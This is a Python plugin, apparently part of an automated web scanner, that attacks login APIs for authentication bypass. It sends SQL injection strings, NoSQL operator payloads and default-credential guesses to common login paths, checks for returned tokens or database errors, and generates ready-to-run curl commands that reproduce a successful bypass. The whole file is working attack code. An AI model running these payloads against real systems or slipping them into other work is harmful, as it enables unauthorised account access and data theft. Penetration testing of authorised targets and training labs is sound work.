import json
from ..http_engine import HTTPEngine

class APIInjectionSkill:
    def __init__(self):
        self.name = "API JSON Injection (Login Bypass)"
        self.payloads = [
            {"email": "' OR 1=1--", "password": "test"},
            {"email": "admin' OR 1=1--", "password": "test"},
            {"username": "' OR 1=1--", "password": "test"},
            {"email": {"$ne": None}, "password": {"$ne": None}},
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"email": "admin@admin.com", "password": "admin"},
            {"email": "admin@juice-sh.op", "password": "admin123"},
            {"email": "test@test.com", "password": "test"},
            {"username": "admin", "password": "password"}
        ]
        self.error_signatures = ["SQL syntax", "SQLite", "Unclosed quotation", "syntax error"]
        
        self.forced_endpoints = [
            "/rest/user/login", "/api/login", "/api/v1/login", 
            "/login", "/auth/login", "/api/auth/login"
        ]

    async def run(self, target: dict, engine: HTTPEngine) -> list:
        findings = []
        url = target["url"]
        method = target["method"]
        
        urls_to_test = []
        if method == "POST" and any(api in url.lower() for api in ["/api/", "/rest/", "/user/", "/login"]):
            urls_to_test.append(url)
            
        from urllib.parse import urlparse
        parsed = urlparse(url)
        if parsed.path == "" or parsed.path == "/":
            for endpoint in self.forced_endpoints:
                urls_to_test.append(f"{parsed.scheme}://{parsed.netloc}{endpoint}")

        if not urls_to_test:
            return findings

        for test_url in urls_to_test:
            for payload_dict in self.payloads:
                headers = {"Content-Type": "application/json"}
                response = await engine.request("POST", test_url, data=json.dumps(payload_dict), headers=headers)
                
                if not response:
                    continue
                    
                is_error = any(sig.lower() in response.text.lower() for sig in self.error_signatures)
                is_bypass = response.status_code == 200 and ("token" in response.text.lower() or "authentication" in response.text.lower())

                if is_bypass:
                    poc = f"Run this to bypass login:\ncurl -X POST -H 'Content-Type: application/json' -d '{json.dumps(payload_dict)}' {test_url}"
                    findings.append({
                        "skill": self.name,
                        "target": test_url,
                        "issue": f"Authentication Bypass (SQLi/NoSQLi/Weak Pass)",
                        "severity": "Critical",
                        "evidence": f"Payload successfully bypassed authentication. Server returned a token.",
                        "poc": poc
                    })
                    break 
                    
                elif is_error:
                    poc = f"Run this to trigger the error:\ncurl -X POST -H 'Content-Type: application/json' -d '{json.dumps(payload_dict)}' {test_url}"
                    findings.append({
                        "skill": self.name,
                        "target": test_url,
                        "issue": f"Potential JSON SQLi (Error Message)",
                        "severity": "High",
                        "evidence": f"Payload triggered a database error message.",
                        "poc": poc
                    })
                
        return findings
